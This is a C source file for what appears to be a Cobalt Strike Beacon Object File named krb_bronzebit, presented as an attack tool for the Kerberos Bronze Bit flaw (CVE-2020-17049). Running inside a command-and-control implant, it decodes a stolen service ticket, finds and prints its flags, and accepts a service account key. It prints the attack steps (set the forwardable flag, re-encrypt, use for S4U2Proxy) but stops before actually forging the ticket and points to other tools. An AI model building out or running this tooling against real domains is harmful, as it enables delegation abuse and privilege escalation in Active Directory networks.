/*
 * krb_bronzebit - CVE-2020-17049 Bronze Bit Attack
 *
 * Exploits the Bronze Bit vulnerability where an attacker can flip the
 * forwardable flag in a service ticket to bypass S4U2Proxy restrictions.
 *
 * Usage: krb_bronzebit /ticket:BASE64_ST /targetservice:SPN
 *                      /servicekey:HASH [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Helper: allocate and base64 decode using krb5_utils functions */
static BYTE* b64_decode_alloc(const char* encoded, size_t* out_len) {
    size_t len = strlen(encoded);
    size_t max_out = len / 4 * 3 + 1;
    BYTE* decoded = (BYTE*)malloc(max_out);
    if (!decoded) return NULL;

    *out_len = base64_decode(encoded, len, decoded);
    if (*out_len == 0) {
        free(decoded);
        return NULL;
    }
    return decoded;
}

/* Parse hex string to bytes */
static BYTE* hex_to_bytes(const char* hex, size_t* out_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return NULL;

    *out_len = len / 2;
    BYTE* bytes = (BYTE*)malloc(*out_len);
    if (!bytes) return NULL;

    for (size_t i = 0; i < *out_len; i++) {
        char byte_str[3] = { hex[i*2], hex[i*2+1], '\0' };
        bytes[i] = (BYTE)strtoul(byte_str, NULL, 16);
    }

    return bytes;
}

/* Find and display ticket flags in ASN.1 data */
static int find_ticket_flags(BYTE* data, size_t len, DWORD* flags, size_t* flagsOffset) {
    /* Look for context tag [3] (flags) followed by BIT STRING */
    for (size_t i = 0; i < len - 10; i++) {
        if (data[i] == 0xA3) {
            /* Found context tag [3] */
            size_t offset = i + 1;
            size_t tagLen = asn1_decode_length(data, &offset);
            (void)tagLen;

            if (data[offset] == ASN1_BITSTRING) {
                offset++;
                size_t bsLen = asn1_decode_length(data, &offset);
                if (bsLen >= 5) {
                    /* Skip unused bits indicator */
                    offset++;
                    *flagsOffset = offset;
                    *flags = (data[offset] << 24) | (data[offset+1] << 16) |
                             (data[offset+2] << 8) | data[offset+3];
                    return 1;
                }
            }
        }
    }
    return 0;
}

/* Display ticket flags */
static void print_ticket_flags(DWORD flags, formatp* output) {
    BeaconFormatPrintf(output, "  Flags: 0x%08X\n", flags);
    BeaconFormatPrintf(output, "    ");
    if (flags & TICKETFLAG_FORWARDABLE) BeaconFormatPrintf(output, "forwardable ");
    if (flags & TICKETFLAG_FORWARDED) BeaconFormatPrintf(output, "forwarded ");
    if (flags & TICKETFLAG_PROXIABLE) BeaconFormatPrintf(output, "proxiable ");
    if (flags & TICKETFLAG_PROXY) BeaconFormatPrintf(output, "proxy ");
    if (flags & TICKETFLAG_RENEWABLE) BeaconFormatPrintf(output, "renewable ");
    if (flags & TICKETFLAG_INITIAL) BeaconFormatPrintf(output, "initial ");
    if (flags & TICKETFLAG_PRE_AUTHENT) BeaconFormatPrintf(output, "pre_authent ");
    if (flags & TICKETFLAG_OK_AS_DELEGATE) BeaconFormatPrintf(output, "ok_as_delegate ");
    BeaconFormatPrintf(output, "\n");
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ticket_b64 = NULL;
    char* targetService = NULL;
    char* serviceKey = NULL;
    char* domain = NULL;
    char* dc = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Bronze Bit Attack (CVE-2020-17049)\n\n");


    ticket_b64 = arg_get(&parser, "ticket");
    targetService = arg_get(&parser, "targetservice");
    serviceKey = arg_get(&parser, "servicekey");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");

    if (!ticket_b64) {
        BeaconFormatPrintf(&output, "[-] Error: /ticket:BASE64 required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_bronzebit /ticket:BASE64_SERVICE_TICKET\n");
        BeaconFormatPrintf(&output, "                    /targetservice:SPN /servicekey:HASH\n");
        BeaconFormatPrintf(&output, "                    [/domain:DOMAIN] [/dc:DC]\n\n");
        BeaconFormatPrintf(&output, "This attack modifies the forwardable flag in a service ticket.\n");
        BeaconFormatPrintf(&output, "Requires the service account's AES/RC4 key to re-encrypt.\n\n");
        BeaconFormatPrintf(&output, "Steps:\n");
        BeaconFormatPrintf(&output, "  1. Obtain a service ticket via S4U2Self (non-forwardable)\n");
        BeaconFormatPrintf(&output, "  2. Decrypt with service key, set forwardable flag\n");
        BeaconFormatPrintf(&output, "  3. Re-encrypt and use for S4U2Proxy\n");
        goto cleanup;
    }


    size_t ticket_len;
    BYTE* ticket = b64_decode_alloc(ticket_b64, &ticket_len);
    if (!ticket) {
        BeaconFormatPrintf(&output, "[-] Failed to decode ticket\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Ticket size: %d bytes\n", (int)ticket_len);

    /* Analyze ticket structure */
    if (ticket[0] == 0x61 || ticket[0] == 0x6D) {
        BeaconFormatPrintf(&output, "[*] Ticket type: %s\n",
            ticket[0] == 0x61 ? "AP-REQ" : "TGS-REP");
    } else if (ticket[0] == 0x76) {
        BeaconFormatPrintf(&output, "[*] Ticket type: KRB-CRED (kirbi)\n");
    } else {
        BeaconFormatPrintf(&output, "[?] Unknown ticket type: 0x%02X\n", ticket[0]);
    }

    /* Try to find ticket flags in the outer (unencrypted) structure */
    DWORD currentFlags = 0;
    size_t flagsOffset = 0;

    BeaconFormatPrintf(&output, "\n[*] Analyzing ticket structure...\n");

    if (find_ticket_flags(ticket, ticket_len, &currentFlags, &flagsOffset)) {
        BeaconFormatPrintf(&output, "[*] Found ticket flags at offset %d\n", (int)flagsOffset);
        BeaconFormatPrintf(&output, "[*] Current flags:\n");
        print_ticket_flags(currentFlags, &output);

        if (currentFlags & TICKETFLAG_FORWARDABLE) {
            BeaconFormatPrintf(&output, "\n[!] Ticket is already forwardable!\n");
        } else {
            BeaconFormatPrintf(&output, "\n[!] Ticket is NOT forwardable\n");
            BeaconFormatPrintf(&output, "[*] Bronze Bit would set forwardable flag\n");

            DWORD newFlags = currentFlags | TICKETFLAG_FORWARDABLE;
            BeaconFormatPrintf(&output, "\n[*] Target flags:\n");
            print_ticket_flags(newFlags, &output);
        }
    } else {
        BeaconFormatPrintf(&output, "[!] Could not locate ticket flags in structure\n");
        BeaconFormatPrintf(&output, "[!] Flags may be in encrypted portion\n");
    }

    if (!serviceKey) {
        BeaconFormatPrintf(&output, "\n[!] No service key provided\n");
        BeaconFormatPrintf(&output, "[!] Cannot modify encrypted ticket without key\n");
        BeaconFormatPrintf(&output, "\n[*] To complete the attack, provide:\n");
        BeaconFormatPrintf(&output, "    /servicekey:AES256_KEY_HEX or RC4_HASH\n");
    } else {
        size_t key_len;
        BYTE* key = hex_to_bytes(serviceKey, &key_len);
        if (!key) {
            BeaconFormatPrintf(&output, "[-] Invalid service key format\n");
        } else {
            BeaconFormatPrintf(&output, "\n[*] Service key provided (%d bytes)\n", (int)key_len);

            if (key_len == 16) {
                BeaconFormatPrintf(&output, "[*] Key type: RC4-HMAC (NT hash)\n");
            } else if (key_len == 32) {
                BeaconFormatPrintf(&output, "[*] Key type: AES256-CTS-HMAC-SHA1\n");
            } else {
                BeaconFormatPrintf(&output, "[?] Unknown key type (length=%d)\n", (int)key_len);
            }

            BeaconFormatPrintf(&output, "\n[!] Full Bronze Bit implementation requires:\n");
            BeaconFormatPrintf(&output, "    1. ASN.1 parsing of encrypted ticket portion\n");
            BeaconFormatPrintf(&output, "    2. Kerberos decryption (AES/RC4)\n");
            BeaconFormatPrintf(&output, "    3. Modification of EncTicketPart flags\n");
            BeaconFormatPrintf(&output, "    4. Re-encryption with service key\n");
            BeaconFormatPrintf(&output, "    5. PAC checksum update\n");
            BeaconFormatPrintf(&output, "\n[*] Consider using Rubeus or Impacket for full implementation\n");

            free(key);
        }
    }

    free(ticket);

cleanup:
    if (ticket_b64) free(ticket_b64);
    if (targetService) free(targetService);
    if (serviceKey) free(serviceKey);
    if (domain) free(domain);
    if (dc) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
